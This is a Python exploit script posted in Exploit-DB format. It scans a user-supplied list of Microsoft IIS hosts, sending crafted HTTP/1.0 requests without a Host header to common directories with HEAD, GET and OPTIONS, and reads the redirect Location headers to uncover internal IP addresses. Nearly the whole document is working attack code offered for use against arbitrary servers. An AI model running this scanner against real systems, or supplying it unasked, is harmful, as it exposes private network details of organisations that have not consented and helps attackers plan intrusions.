# Exploit Title: Optimized IIS-HTTP-Internal-IP-Finder exploit (metasploit)
# Google Dork: -
# Date: 2020-05-18
# Exploit Author: KouroshRZ
# Vendor Homepage: https://www.microsoft.com
# Software Link: https://www.microsoft.com/en-us/download/details.aspx?id=48264
# Version: IIS http webserver 7.5, 8.5, 10 (it depends on configuration)
# Tested on: windows 
# CVE : -




# Copyright (c) 2018, Heather Pilkington of rapid7                                      #
# All rights reserved. 
# https://www.rapid7.com/db/modules/auxiliary/scanner/http/iis_internal_ip





# This exploit is inspired by metasaploit framework module "Microsoft IIS HTTP Internal IP Disclosure"
# But here I'm gonna try to cover more possible situiations (multiple methods and urls) with several hosts for input
# The exploit is simple
# Just one http version 1.0 request without Host header to a protected directory with removing ending "/"

# Hosts list are in format like below
# <prorocol>://<domain or IP address>:<port>
# For more info read the example-hosts.txt


from re import compile
import socket
from ssl import SSLContext, PROTOCOL_TLS_CLIENT
from colorama import Fore, Style, Back, init
from time import sleep
from sys import stdout, argv


init(convert=True)
stdout_write = stdout.write


protocol = ''
server_name = ''
server_ip = ''
server_port = ''
found = False


# All we need is some 30* redirection to find the internal IP !
# These urls may cause a redirecttion
# If you know specific redirection url in target web server add in the list below
# remember to remove the ending "/"
# like this "/example_url" not this one "/example_url/"

possible_iis_redirect_urls = [
    '/',
    '/Upload',
    '/Content',
    '/aspnet_client',
    '/images',
    '/uploads',
    '/files',
    '/updatemanager',
    '/users',
    '/all',
    '/modules',
    '/admin',
    '/default.htm',
    '/default.html',
    '/default.aspx',
    '/contents',
    '/public',
    '/css',
    '/js',
    '/common',
    '/owa',
]

# Our preference http method is HEAD
# But there may not be any routes for HEAD method 
# So we try GET and OPTIONS methods too

http_methods = [
    'HEAD',
    'GET',
    'OPTIONS'
]

def enumerate_internal_IP_addresses(hosts_file=''):

    global found
    banner = r"""

    
         _____  _                 _____       _              _____ _____  _____                                     
        |  __ \(_)               |_   _|     | |            |_   _|_   _|/ ____|                                    
        | |  | |___   _____        | |  _ __ | |_ ___         | |   | | | (___                                      
        | |  | | \ \ / / _ \       | | | '_ \| __/ _ \        | |   | |  \___ \                                     
        | |__| | |\ V /  __/      _| |_| | | | || (_) |      _| |_ _| |_ ____) |                                    
        |_____/|_|_\_/ \___|     |_____|_|_|_|\__\___/      |_____|_____|_____/

         _____  _____  _______      __  _______ ______       _   _ ______ _________          ______  _____   _  __
        |  __ \|  __ \|_   _\ \    / /\|__   __|  ____|     | \ | |  ____|__   __\ \        / / __ \|  __ \ | |/ /
        | |__) | |__) | | |  \ \  / /  \  | |  | |__        |  \| | |__     | |   \ \  /\  / / |  | | |__)  | ' / 
        |  ___/|  _  /  | |   \ \/ / /\ \ | |  |  __|       | . ` |  __|    | |    \ \/  \/ /| |  | |  _  / |  <  
        | |    | | \ \ _| |_   \  / ____ \| |  | |____      | |\  | |____   | |     \  /\  / | |__| | | \ \ | . \ 
        |_|    |_|  \_\_____|   \/_/    \_\_|  |______|     |_| \_|______|  |_|      \/  \/   \____/|_|  \_\|_|\_\ 
        
                                                                                                                 
                                                                                                                                                                                                       
    """

    print(banner)

    try:
        hosts_list = open(hosts_file, 'r').readlines()
    except OSError as err:
        print(Fore.BLACK + Back.LIGHTRED_EX)
        print("    "  + str(err))
        print(Style.RESET_ALL)
        return


    for host in hosts_list:

        found = False
        
        # host entry validation
        if host == "\n" or host == '' or host[0] == "#":
            continue

        if host[len(host)-1] == "\n":
            host = host[:-1]

        regex_host_format = compile(r"^https?:\/\/.*:\d+$")

        if regex_host_format.match(host) == None:
            print(Fore.LIGHTRED_EX + "\n[!] Wrong host format : {}\n".format(host) + Style.RESET_ALL)
            continue
        
        # host entry parsing parameters
        protocol = host[ : host.find("://")]
        server_name = host[host.find("://") + 3 : host.find(":", 6)]
        server_port = int(host[host.find(":", 7) + 1 : ])


        regex_ip = compile(r"^\d+\.\d+\.\d+\.\d+$")
        regex_ip_header = compile(r"^https?:\/\/\d+\.\d+\.\d+\.\d+.*")

        http_requests = []

        # crafting all possible requests
        for method in http_methods:
            for url in possible_iis_redirect_urls:
                http_requests.append("{} {} HTTP/1.0\r\nConnection: close\r\n\r\n".format(method, url))

        if regex_ip.match(server_name) == None:
            try:
                server_ip = socket.gethostbyname(server_name)
                print(Fore.LIGHTCYAN_EX + "* Host {}:{} resolved to IP {}:{}\n".format(server_name, server_port, server_ip, server_port) + Style.RESET_ALL)
            except OSError as err:
                print("    " + Fore.BLACK + Back.LIGHTRED_EX + "[-] Error on resolving the host {}".format(server_name))
                print(Style.RESET_ALL)
                print("    " + str(err))
                continue
        else:
            server_ip = server_name
        
        
        if protocol == 'http':

            for request in http_requests:

                sleep(0.1)
                method = request[ : request.find(" ")]
                url = request[request.find(" ") + 1 : request.find("HTTP") - 1]

                try:
                    sock_http = socket.create_connection((server_name, server_port))
                    sock_http.settimeout(10)
                except OSError as err:
                    print("\n    " + Back.LIGHTRED_EX + Fore.BLACK + "[-] Error on connecting to host {}:{}".format(server_name, server_port) + Style.RESET_ALL)
                    print("    " + str(err))
                    break
                        
                
                stdout_write('\r')
                stdout_write('                                                                                                                     ')
                stdout_write('\r')
                print(Fore.LIGHTCYAN_EX + "    [*]" + Style.RESET_ALL +  " Trying request {}".format( repr(request) ), end="\r")

                sock_http.sendall(request.encode())

                response = ''

                try:
                    recv = sock_http.recv(1024).decode("utf-8", errors='ignore')
                    response += recv
                except OSError as err:
                    print("\n    " + Fore.BLACK + Back.LIGHTRED_EX + "[-] Some error happened on Receiving data" + Style.RESET_ALL)
                    print("    " + str(err))
                    sock_http.close()
                    break

                if response != '' and response.find("Location") > -1 and response.find("http") > -1:
                    
                    # redirection found with location header

                    tmp_index_1 = response.find("http")
                    tmp_index_2 = response.find("\n", tmp_index_1)

                    location = response[ tmp_index_1 : tmp_index_2 ]
                    
                    # checking the location header for having correct format
                    # http[s]://<IP-address>/urls
                    if regex_ip_header.match(location) == None:

                        print(Fore.LIGHTYELLOW_EX)
                        print("        [!] Redirection found with location header but does not contain IP address !! : {}".format(location) + Style.RESET_ALL)\
                        
                        sock_http.close()
                        continue
                    
                    print("\n")
                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " private IP address found for {}".format(host))
                    print(Fore.LIGHTGREEN_EX + "    [+]  Internal IP address redirection : " + Fore.LIGHTGREEN_EX + location)
                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " HTTP method : {}".format(method))
                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " Redirect URL : {}".format(url))
                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " Raw request : {}".format( repr(request) ) )

                    sleep(0.1)
                    found = True

                    sock_http.close()
                    
                    # As soon as we found the Internal IP address, no need for other requests so we break the loop
                    # break
                    
                sock_http.close()

            if not found:
                print(Fore.LIGHTRED_EX + "\n\n    [-] No Internal IP address found for {}:{}\n".format(server_name, server_port) + Style.RESET_ALL)                

            print("\n**************************************************************************************\n")

     
        elif protocol == 'https':
            
            context = SSLContext(PROTOCOL_TLS_CLIENT)

            for request in http_requests:

                method = request[ : request.find(" ")]
                url = request[request.find(" ") + 1 : request.find("HTTP") - 1]

                try:
                    sock_https = socket.create_connection((server_name, server_port))
                    context = SSLContext()
                    ssock = context.wrap_socket(sock_https, server_hostname=server_name)
                    ssock.settimeout(10)
                except OSError as err:
                    print("\n    " + Back.LIGHTRED_EX + Fore.BLACK + "[-] Error on connecting to host {}:{}".format(server_name, server_port) + Style.RESET_ALL)
                    print("    " + str(err))
                    break

                stdout_write('\r')
                stdout_write('                                                                                           ')
                stdout_write('\r')
                print(Fore.LIGHTCYAN_EX + "    [*]" + Style.RESET_ALL +  " Trying request {}".format( repr(request) ), end='\r')
                
                ssock.sendall(request.encode())
                    
                response = ''

                try:
                    recv = ssock.recv(1024).decode("utf-8", errors='ignore')
                    response += recv
                except OSError as err:
                    print("\n    " + Fore.BLACK + Back.LIGHTRED_EX + "[-] Some error happened on Receiving data" + Style.RESET_ALL)
                    print("    " + str(err))
                    sock_https.close()
                    ssock.close()
                    break

                if response != '' and response.find("Location") > -1 and response.find("http") > -1:

                    # redirection found with location header

                    tmp_index_1 = response.find("http")
                    tmp_index_2 = response.find("\n", tmp_index_1)

                    location = response[ tmp_index_1: tmp_index_2 ]
                    
                    # checking the location header for having correct format
                    # http[s]://<IP-address>/url
                    if regex_ip_header.match(location) == None:
                        print(Fore.LIGHTYELLOW_EX)
                        print("        [!] Redirection found with location header but does not contain IP address !! : {}".format(location) + Style.RESET_ALL)
                        sock_https.close()
                        ssock.close()
                        continue
                    
                    print("\n")
                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " private IP address found for {}".format(host))
                    print(Fore.LIGHTGREEN_EX + "    [+]  Internal IP address redirection : " + Fore.LIGHTGREEN_EX + location)
                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " HTTP method : {}".format(method))
                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " Redirect URL : {}".format(url))
                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " Raw request : {}".format( repr(request) ) )

                    sleep(0.1)
                    found = True

                    sock_https.close()
                    ssock.close()

                    # As soon as we found the Internal IP address, no need for other requests so we break the loop
                    break
                
                sock_https.close()
                ssock.close()

            if not found:
                print(Fore.LIGHTRED_EX + "\n\n    [-] No Internal IP address found for {}:{}\n".format(server_name, server_port) + Style.RESET_ALL)                

            print("\n**************************************************************************************\n")

    return


if __name__ == "__main__":

    if len(argv) != 2:
        print("Usage : python Internal-Ip-Disclosure.py example-hosts.txt")
    else:
        enumerate_internal_IP_addresses(argv[1])